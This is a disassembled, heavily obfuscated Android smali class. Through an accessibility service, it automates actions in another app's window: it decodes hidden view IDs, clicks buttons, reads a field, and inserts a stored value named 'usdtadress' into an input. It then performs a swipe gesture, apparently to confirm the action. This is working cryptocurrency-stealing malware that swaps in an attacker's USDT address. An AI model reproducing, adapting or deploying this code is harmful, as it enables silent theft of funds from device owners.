.class Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Lcom/vknnolqo/p9sv5zvf/TEh82iEU$c;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;->onClick(Landroid/view/View;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;


# direct methods
.method constructor <init>(Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;)V
    .locals 0

    iput-object p1, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;->a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a()V
    .locals 8

    .line 1
    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;->a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;

    iget-object v0, v0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x22

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    const/16 v3, 0x10

    const/4 v4, 0x0

    const/4 v5, 0x1

    if-ne v1, v5, :cond_0

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_0
    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;->a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;

    iget-object v0, v0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x24

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v6, v2, [B

    fill-array-data v6, :array_3

    invoke-static {v1, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    if-ne v1, v5, :cond_1

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_1

    :try_start_0
    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;->a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;

    iget-object v0, v0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x25

    new-array v6, v1, [B

    fill-array-data v6, :array_4

    new-array v7, v2, [B

    fill-array-data v7, :array_5

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v6

    if-ne v6, v5, :cond_2

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_2
    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;->a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;

    iget-object v0, v0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    new-array v6, v1, [B

    fill-array-data v6, :array_6

    new-array v7, v2, [B

    fill-array-data v7, :array_7

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v6

    if-ne v6, v5, :cond_3

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    new-instance v6, Landroid/os/Bundle;

    invoke-direct {v6}, Landroid/os/Bundle;-><init>()V

    new-array v1, v1, [B

    fill-array-data v1, :array_8

    new-array v7, v2, [B

    fill-array-data v7, :array_9

    invoke-static {v1, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v7, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->usdtadress:Ljava/lang/String;

    invoke-virtual {v6, v1, v7}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    const/high16 v1, 0x200000

    invoke-virtual {v0, v1, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    :cond_3
    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;->a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;

    iget-object v0, v0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x1c

    new-array v1, v1, [B

    fill-array-data v1, :array_a

    new-array v2, v2, [B

    fill-array-data v2, :array_b

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    if-ne v1, v5, :cond_4

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_4
    const-wide/16 v0, 0x3e8

    :try_start_1
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_5

    new-instance v2, Landroid/graphics/Path;

    invoke-direct {v2}, Landroid/graphics/Path;-><init>()V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/j70;->c(Landroid/content/Context;)I

    move-result v0

    div-int/lit8 v0, v0, 0x2

    int-to-float v0, v0

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/j70;->b(Landroid/content/Context;)I

    move-result v1

    int-to-float v1, v1

    const v3, 0x3f4ccccd    # 0.8f

    mul-float/2addr v3, v1

    invoke-virtual {v2, v0, v3}, Landroid/graphics/Path;->moveTo(FF)V

    const/high16 v3, 0x40800000    # 4.0f

    div-float/2addr v1, v3

    invoke-virtual {v2, v0, v1}, Landroid/graphics/Path;->lineTo(FF)V

    new-instance v0, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v0}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    const-wide/16 v3, 0x1

    const-wide/16 v5, 0x5dc

    const/4 v7, 0x0

    invoke-static/range {v2 .. v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cm;->a(Landroid/graphics/Path;JJZ)Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {v0}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object v0

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-instance v2, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a$a;

    invoke-direct {v2, p0}, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a$a;-><init>(Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;)V

    invoke-static {v1, v0, v2}, Lcom/vknnolqo/p9sv5zvf/TEh82iEU;->f(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Landroid/accessibilityservice/GestureDescription;Lcom/vknnolqo/p9sv5zvf/TEh82iEU$c;)V

    :cond_5
    return-void

    :catch_1
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    nop

    :array_0
    .array-data 1
        -0x26t
        0x1t
        -0x1ct
        0x7ct
        0x4at
        0x66t
        -0x30t
        0x6t
        -0x30t
        0x5et
        -0x59t
        0x31t
        0x43t
        0x29t
        -0x3dt
        0x2t
        -0x33t
        0xbt
        -0x20t
        0x62t
        0x17t
        0x6et
        -0x40t
        0x4ct
        -0x28t
        0x3t
        -0x1at
        0x27t
        0x43t
        0x73t
        -0x5t
        0x2t
        -0x2bt
        0x2t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x47t
        0x6et
        -0x77t
        0x52t
        0x2dt
        0x7t
        -0x5ct
        0x63t
    .end array-data

    :array_2
    .array-data 1
        0x8t
        -0x1t
        0x22t
        -0x22t
        -0x49t
        0xct
        -0x61t
        -0x5at
        0x2t
        -0x60t
        0x61t
        -0x6dt
        -0x42t
        0x43t
        -0x74t
        -0x5et
        0x1ft
        -0xbt
        0x26t
        -0x40t
        -0x16t
        0x4t
        -0x71t
        -0x14t
        0xat
        -0x3t
        0x20t
        -0x7bt
        -0x42t
        0x19t
        -0x4ct
        -0x56t
        0x5t
        -0x20t
        0x3at
        -0x7ct
    .end array-data

    :array_3
    .array-data 1
        0x6bt
        -0x70t
        0x4ft
        -0x10t
        -0x30t
        0x6dt
        -0x15t
        -0x3dt
    .end array-data

    :array_4
    .array-data 1
        0x1ft
        -0x1at
        0x65t
        -0x56t
        -0x33t
        -0x29t
        0x4bt
        0x1at
        0x15t
        -0x47t
        0x26t
        -0x19t
        -0x3ct
        -0x68t
        0x58t
        0x1et
        0x8t
        -0x14t
        0x61t
        -0x4ct
        -0x70t
        -0x21t
        0x5bt
        0x50t
        0x1dt
        -0x13t
        0x6ct
        -0xat
        -0x31t
        -0x3bt
        0x4ct
        0x20t
        0x1ft
        -0x1bt
        0x6dt
        -0x1bt
        -0x28t
    .end array-data

    nop

    :array_5
    .array-data 1
        0x7ct
        -0x77t
        0x8t
        -0x7ct
        -0x56t
        -0x4at
        0x3ft
        0x7ft
    .end array-data

    :array_6
    .array-data 1
        0x70t
        -0x1bt
        -0x30t
        -0x5bt
        0x6et
        0x4at
        -0x1dt
        -0x80t
        0x7at
        -0x46t
        -0x6dt
        -0x18t
        0x67t
        0x5t
        -0x10t
        -0x7ct
        0x67t
        -0x11t
        -0x2ct
        -0x45t
        0x33t
        0x42t
        -0xdt
        -0x36t
        0x72t
        -0x12t
        -0x27t
        -0x7t
        0x6ct
        0x58t
        -0x1ct
        -0x46t
        0x76t
        -0x1ct
        -0x37t
        -0x12t
        0x7bt
    .end array-data

    nop

    :array_7
    .array-data 1
        0x13t
        -0x76t
        -0x43t
        -0x75t
        0x9t
        0x2bt
        -0x69t
        -0x1bt
    .end array-data

    :array_8
    .array-data 1
        -0x7bt
        -0x56t
        -0xat
        -0x60t
        -0x69t
        -0x5ct
        0x76t
        0x4et
        -0x6at
        -0x52t
        -0x9t
        -0x5ct
        -0x63t
        -0x5ct
        0x7dt
        0x50t
        -0x69t
        -0x54t
        -0xat
        -0x4at
        -0x74t
        -0x51t
        0x71t
        0x5bt
        -0x65t
        -0x56t
        -0x16t
        -0x58t
        -0x76t
        -0x47t
        0x6ct
        0x5et
        -0x6ft
        -0x54t
        -0x14t
        -0x56t
        -0x63t
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x3ct
        -0x17t
        -0x5et
        -0x17t
        -0x28t
        -0x16t
        0x29t
        0xft
    .end array-data

    :array_a
    .array-data 1
        0x32t
        -0x61t
        -0x6bt
        0x54t
        0x21t
        0x2t
        0x39t
        -0x30t
        0x38t
        -0x40t
        -0x2at
        0x19t
        0x28t
        0x4dt
        0x2at
        -0x2ct
        0x25t
        -0x6bt
        -0x6ft
        0x4at
        0x7ct
        0xat
        0x29t
        -0x66t
        0x3ft
        -0x6bt
        -0x80t
        0xet
    .end array-data

    :array_b
    .array-data 1
        0x51t
        -0x10t
        -0x8t
        0x7at
        0x46t
        0x63t
        0x4dt
        -0x4bt
    .end array-data
.end method

.method public b()V
    .locals 0

    .line 1
    return-void
.end method
